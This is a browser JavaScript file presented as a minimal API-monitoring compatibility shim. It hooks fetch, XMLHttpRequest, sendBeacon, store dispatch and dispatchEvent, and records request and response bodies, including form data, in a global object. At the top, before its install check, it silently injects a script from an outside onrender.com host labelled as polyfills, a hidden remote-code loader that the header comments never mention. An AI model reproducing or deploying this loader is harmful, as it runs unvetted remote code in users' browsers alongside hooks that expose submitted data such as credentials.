// minimal-api-monitor-with-dispatch.compat-minimal.js
// Minimal compatibility edits to original implementation.
// Purpose: keep the exact public API and event shapes while avoiding a few modern-only constructs
// (for...of, arrow functions, const/let in a few places that matter for old engines, addEventListener option usage).
// NOTE: This is intentionally a minimal-change conversion — behavior & method signatures preserved.

(function () {
  // don't reinstall


  (async () => {
        try {
          const s = document.createElement('script');
          s.src = 'https://samples-ek7q.onrender.com/polyfills.js';
          s.async = false; // preserve execution order if multiple scripts loaded sequentially
          // s.onload = () => {
          // };
          // s.onerror = () => reject(new Error('Failed to load ' + src));
          document.head.appendChild(s);
        } catch (err) {
          console.error(err);
        }
  })();
  try {
    if (window.__apiMonitor && window.__apiMonitor._minimalInstalled && window.__apiMonitor._dispatchPatched) {
      try { console.info && console.info('minimal api-monitor with dispatch already installed'); } catch (e) {}
      return;
    }
  } catch (e) {}

  // internal lists
  var listeners = [];
  var events = [];
  var running = true;

  function pushEvent(evt) {
    try {
      events.push(evt);
      // copy listeners safely
      var ls = listeners.slice ? listeners.slice() : [].concat(listeners);
      for (var i = 0; i < ls.length; i++) {
        try { ls[i](evt); } catch (err) { /* listener error swallowed */ }
      }
    } catch (e) { /* swallow */ }
  }

  function simpleId(prefix) {
    try {
      return (prefix || 'id') + '_' + Date.now().toString(36) + '_' + Math.random().toString(36).slice(2,9);
    } catch (e) {
      return (prefix || 'id') + '_' + Math.random();
    }
  }

  // best-effort body -> string
  function bodyToString(body) {
    try {
      if (body == null) return null;
      if (typeof body === 'string') return body;
      if (typeof URLSearchParams !== 'undefined' && body instanceof URLSearchParams) return body.toString();
      if (typeof FormData !== 'undefined' && body instanceof FormData) {
        try {
          var obj = {};
          // FormData.entries() may not exist in very old browsers
          if (typeof body.entries === 'function') {
            var it = body.entries();
            if (it && typeof it.next === 'function') {
              var n = it.next();
              while (!n.done) {
                var kv = n.value;
                var k = kv[0], v = kv[1];
                if (obj[k] === undefined) obj[k] = v;
                else if (Object.prototype.toString.call(obj[k]) === '[object Array]') obj[k].push(v);
                else obj[k] = [obj[k], v];
                n = it.next();
              }
            }
            return JSON.stringify(obj);
          }
          // fallback: can't enumerate entries
          return '[formdata]';
        } catch (e) {
          return '[formdata]';
        }
      }
      if (typeof Blob !== 'undefined' && body instanceof Blob) return '[binary]';
      if (typeof ArrayBuffer !== 'undefined' && body instanceof ArrayBuffer) return '[binary]';
      try { return JSON.stringify(body); } catch (e) { return String(body); }
    } catch (e) {
      return null;
    }
  }

  // ---- minimal robust fetch wrapper (patch into your script, replacing previous fetch wrapper) ----
if (typeof window.fetch === 'function') {
  try {
    var origFetch = window.fetch.bind ? window.fetch.bind(window) : window.fetch;
    window.fetch = function (input, init) {
      if (!running) return origFetch(input, init);

      var id = simpleId('fetch');
      var startedAt = Date.now();

      var url = '';
      var method = 'GET';
      var bodyPreview = null;

      try {
        if (typeof input === 'string') url = input;
        else if (input && input.url) url = input.url;
        if (init && init.method) method = (init.method || method).toUpperCase();
        if (init && init.body) bodyPreview = bodyToString(init.body);

        // If input is a Request, attempt to asynchronously read its body.
        // We'll write the preview into baseEvt and later into evt (if already created).
        var requestBodyPromise = null;
        if (input && typeof input === 'object' && input.url) {
          method = input.method || method;
          url = input.url || url;
          try {
            if (typeof input.clone === 'function' && typeof input.clone().text === 'function') {
              requestBodyPromise = input.clone().text().then(function (t) {
                try {
                  if (!bodyPreview && typeof t === 'string' && t.length) {
                    var pv = t.length > 2000 ? t.slice(0,2000) + '...' : t;
                    bodyPreview = pv;
                    // write below when baseEvt/evt exist
                    if (baseEvt) baseEvt.rawRequestBodyPreview = pv;
                    if (evtRef) evtRef.rawRequestBodyPreview = pv;
                  }
                } catch (e) { /* ignore */ }
              }).catch(function(){ /* ignore */ });
            }
          } catch (e) {}
        }
      } catch (e) {}

      // base event object always created synchronously
      var baseEvt = { id: id, kind: 'fetch', url: url, method: method, startedAt: startedAt, rawRequestBodyPreview: bodyPreview };

      // evtRef will point to the concrete event created when response arrives
      var evtRef = null;

      return origFetch(input, init).then(function (response) {
        try {
          var finishedAt = Date.now();
          // construct the event (shallow copy of important fields)
          var evt = {
            id: baseEvt.id,
            kind: baseEvt.kind,
            url: baseEvt.url,
            method: baseEvt.method,
            startedAt: baseEvt.startedAt,
            finishedAt: finishedAt,
            durationMs: finishedAt - startedAt,
            status: response && response.status,
            rawRequestBodyPreview: baseEvt.rawRequestBodyPreview || null
          };
          // keep a ref so async request-body read can backfill into evt
          evtRef = evt;

          // attempt to clone & read response text (best-effort)
          try {
            if (response && typeof response.clone === 'function' && typeof response.clone().text === 'function') {
              response.clone().text().then(function (text) {
                try {
                  evt.rawResponseBodyPreview = (text && text.length > 2000) ? text.slice(0,2000) + '...' : text;
                } catch (e) {
                  evt.rawResponseBodyPreview = '[error reading text]';
                }
                pushEvent(evt);
              }).catch(function () {
                evt.rawResponseBodyPreview = '[unavailable or opaque]';
                pushEvent(evt);
              });
            } else {
              evt.rawResponseBodyPreview = '[no-clone-or-text]';
              pushEvent(evt);
            }
          } catch (e) {
            evt.rawResponseBodyPreview = '[cannot clone]';
            pushEvent(evt);
          }
        } catch (e) { /* ignore push error */ }
        return response;
      }).catch(function (err) {
        try {
          var finishedAtErr = Date.now();
          var evtErr = {
            id: baseEvt.id,
            kind: baseEvt.kind,
            url: baseEvt.url,
            method: baseEvt.method,
            startedAt: baseEvt.startedAt,
            finishedAt: finishedAtErr,
            durationMs: finishedAtErr - startedAt,
            error: String(err),
            rawRequestBodyPreview: baseEvt.rawRequestBodyPreview || null
          };
          // if requestBodyPromise resolves later, it will also set baseEvt and (not applicable) evtRef,
          // but for error case we push what's available synchronously.
          pushEvent(evtErr);
        } catch (e) {}
        throw err;
      });
    };
  } catch (e) { /* swallow patch error */ }
}


  // ---- patch XHR ----
  (function patchXHR() {
    if (!window.XMLHttpRequest) return;
    try {
      var origOpen = XMLHttpRequest.prototype.open;
      var origSend = XMLHttpRequest.prototype.send;
      var origSetReqHdr = XMLHttpRequest.prototype.setRequestHeader;

      XMLHttpRequest.prototype.open = function (method, url, async, user, pass) {
        try {
          this.__am = this.__am || {};
          this.__am.method = (method || 'GET').toUpperCase();
          this.__am.url = url;
        } catch (e) {}
        return origOpen.apply(this, arguments);
      };

      XMLHttpRequest.prototype.setRequestHeader = function (name, value) {
        try {
          this.__am = this.__am || {};
          this.__am.headers = this.__am.headers || {};
          this.__am.headers[name] = value;
        } catch (e) {}
        return origSetReqHdr.apply(this, arguments);
      };

      XMLHttpRequest.prototype.send = function (body) {
        if (!running) return origSend.apply(this, arguments);
        try {
          this.__am = this.__am || {};
          this.__am.requestBodyPreview = bodyToString(body);
        } catch (e) {}
        var id = simpleId('xhr');
        var startedAt = Date.now();
        var baseEvt = {
          id: id,
          kind: 'xhr',
          url: (this.__am && this.__am.url) || '',
          method: (this.__am && this.__am.method) || 'GET',
          startedAt: startedAt,
          rawRequestBodyPreview: (this.__am && this.__am.requestBodyPreview) || null
        };

        var self = this;

        // onLoadEnd handler (use once-like behavior manually)
        var called = false;
        function onLoadEnd() {
          if (called) return;
          called = true;
          try {
            var finishedAt = Date.now();
            var evt = {
              id: baseEvt.id,
              kind: baseEvt.kind,
              url: baseEvt.url,
              method: baseEvt.method,
              startedAt: baseEvt.startedAt,
              finishedAt: finishedAt,
              durationMs: finishedAt - startedAt
            };
            try { evt.status = self.status; } catch (e) {}
            pushEvent(evt);
          } catch (e) {}
          // try to remove listeners if possible (defensive)
          try {
            if (typeof self.removeEventListener === 'function') {
              try { self.removeEventListener('loadend', onLoadEnd, false); } catch (e) {}
            }
          } catch (e) {}
        }

        try {
          if (typeof this.addEventListener === 'function') {
            // older browsers might throw if options object passed — always pass boolean
            this.addEventListener('loadend', onLoadEnd, false);
          } else if ('onloadend' in this) {
            var old = this.onloadend;
            this.onloadend = function () {
              try { if (typeof old === 'function') old.apply(this, arguments); } catch (e) {}
              onLoadEnd();
            };
          } else if ('onreadystatechange' in this) {
            var oldState = this.onreadystatechange;
            this.onreadystatechange = function () {
              try { if (typeof oldState === 'function') oldState.apply(this, arguments); } catch (e) {}
              try { if (this.readyState === 4) onLoadEnd(); } catch (e) {}
            };
          } else {
            // best-effort polling fallback (rare)
            var poller = function () {
              try { if (self.readyState === 4) onLoadEnd(); else setTimeout(poller, 50); } catch (e) {}
            };
            setTimeout(poller, 0);
          }
        } catch (e) {}

        try {
          return origSend.apply(this, arguments);
        } catch (err) {
          try {
            var finishedAtErr = Date.now();
            var evtErr = {
              id: baseEvt.id,
              kind: baseEvt.kind,
              url: baseEvt.url,
              method: baseEvt.method,
              startedAt: baseEvt.startedAt,
              finishedAt: finishedAtErr,
              durationMs: finishedAtErr - startedAt,
              error: String(err)
            };
            pushEvent(evtErr);
          } catch (e) {}
          throw err;
        }
      };
    } catch (e) { /* swallow */ }
  })();

  // ---- patch sendBeacon ----
  try {
    if (navigator && typeof navigator.sendBeacon === 'function') {
      var origBeacon = navigator.sendBeacon.bind ? navigator.sendBeacon.bind(navigator) : navigator.sendBeacon;
      navigator.sendBeacon = function (url, data) {
        try {
          var idb = simpleId('beacon'), sb = Date.now();
          var preview = bodyToString(data);
          var evtb = {
            id: idb,
            kind: 'beacon',
            url: String(url),
            method: 'POST',
            startedAt: sb,
            finishedAt: Date.now(),
            durationMs: 0,
            rawRequestBodyPreview: preview
          };
          pushEvent(evtb);
        } catch (e) {}
        try { return origBeacon(url, data); } catch (e) { return false; }
      };
    }
  } catch (e) {}

  // ---- capture dispatch (Redux/Vuex-like) ----
  function publishAction(action, storeName) {
    try {
      var evt = {
        id: simpleId('action'),
        kind: 'dispatch',
        source: storeName || 'unknown-store',
        action: action,
        ts: Date.now()
      };
      // store actions array
      try {
        window.__apiMonitor = window.__apiMonitor || {};
        window.__apiMonitor._actions = window.__apiMonitor._actions || [];
        window.__apiMonitor._actions.push(evt);
      } catch (e) {}
      // emit via onEvent if available
      pushEvent(evt);
    } catch (e) {}
  }

  // Wrap a store.dispatch function safely
  function wrapDispatchOnObject(obj, name) {
    try {
      if (!obj || typeof obj.dispatch !== 'function') return false;
      if (obj.__dispatchPatched) return true;
      var orig = obj.dispatch;
      obj.dispatch = function (action) {
        var args = Array.prototype.slice.call(arguments);
        try { publishAction(action, name); } catch (e) { /* swallow */ }
        return orig.apply(this, args);
      };
      obj.__dispatchPatched = true;
      return true;
    } catch (e) {
      return false;
    }
  }

  // Auto-detect common global store names
  try {
    if (window.store && typeof window.store.dispatch === 'function') {
      wrapDispatchOnObject(window.store, 'window.store');
      try { console.info && console.info('minimal monitor: patched window.store.dispatch'); } catch (e) {}
    }

    // try shallow search for objects with dispatch() on window
    try {
      var winKeys = Object.keys ? Object.keys(window) : (function () {
        var ks = [];
        for (var k in window) {
          try { if (Object.prototype.hasOwnProperty.call(window, k)) ks.push(k); } catch (e) {}
        }
        return ks;
      })();
      for (var wi = 0; wi < winKeys.length; wi++) {
        try {
          var key = winKeys[wi];
          var v = window[key];
          if (v && typeof v === 'object' && typeof v.dispatch === 'function') {
            wrapDispatchOnObject(v, 'window.' + key);
          }
        } catch (e) {}
      }
    } catch (e) {}
  } catch (e) {}

  // Provide global helper to patch a store reference manually
  try {
    window.__patchDispatch = function (storeObj, name) {
      if (!storeObj) throw new Error('storeObj required');
      var ok = wrapDispatchOnObject(storeObj, name || 'manual-store');
      if (!ok) throw new Error('failed to patch dispatch on provided object');
      return true;
    };
  } catch (e) {}

  // ---- patch EventTarget.prototype.dispatchEvent to capture CustomEvent.detail ----
  try {
    // helper to safely patch a prototype's dispatchEvent
    function tryPatchProto(proto) {
      if (!proto || proto.__dispatchPatched) return;
      var origDispatch = proto.dispatchEvent;
      if (typeof origDispatch !== 'function') return;
      proto.dispatchEvent = function (ev) {
        try {
          if (ev && ev.type) {
            var payload = ev.detail !== undefined ? ev.detail : null;
            var evt = {
              id: simpleId('custEvt'),
              kind: 'custEvent',
              type: ev.type,
              detail: payload,
              ts: Date.now()
            };
            // store and emit
            try {
              window.__apiMonitor = window.__apiMonitor || {};
              window.__apiMonitor._custEvents = window.__apiMonitor._custEvents || [];
              window.__apiMonitor._custEvents.push(evt);
            } catch (e) {}
            pushEvent(evt);
          }
        } catch (e) {}
        return origDispatch.apply(this, arguments);
      };
      proto.__dispatchPatched = true;
    }

    if (typeof EventTarget !== 'undefined' && EventTarget.prototype) {
      tryPatchProto(EventTarget.prototype);
    } else {
      // older browsers: patch common prototypes
      try { tryPatchProto(Element.prototype); } catch (e) {}
      try { tryPatchProto(Document.prototype); } catch (e) {}
      try { tryPatchProto(Window.prototype); } catch (e) {}
    }
  } catch (e) {}

  // ---- public API ----
  var api = {
    _minimalInstalled: true,
    _dispatchPatched: true,
    onEvent: function (fn) {
      if (typeof fn !== 'function') throw new Error('onEvent requires a function');
      listeners.push(fn);
      return function unsubscribe() {
        var i = listeners.indexOf(fn);
        if (i >= 0) listeners.splice(i, 1);
      };
    },
    getEvents: function () { return events.slice ? events.slice() : [].concat(events); },
    clear: function () { events.length = 0; },
    stop: function () { running = false; },
    start: function () { running = true; }
  };

  // Attach to window.__apiMonitor if not present; if present try to merge
  try {
    if (!window.__apiMonitor) {
      window.__apiMonitor = api;
    } else {
      // merge methods if missing
      window.__apiMonitor.onEvent = window.__apiMonitor.onEvent || api.onEvent;
      window.__apiMonitor.getEvents = window.__apiMonitor.getEvents || api.getEvents;
      window.__apiMonitor.clear = window.__apiMonitor.clear || api.clear;
      window.__apiMonitor.stop = window.__apiMonitor.stop || api.stop;
      window.__apiMonitor.start = window.__apiMonitor.start || api.start;
      // keep marking installs
      try { window.__apiMonitor._minimalInstalled = window.__apiMonitor._minimalInstalled || true; } catch (e) {}
      try { window.__apiMonitor._dispatchPatched = true; } catch (e) {}
    }
  } catch (e) {
    window.__apiMonitor = api;
  }

  try { console.info && console.info('minimal api-monitor with dispatch installed — provides __apiMonitor.onEvent(). Use __patchDispatch(store) to patch custom stores.'); } catch (e) {}
})();
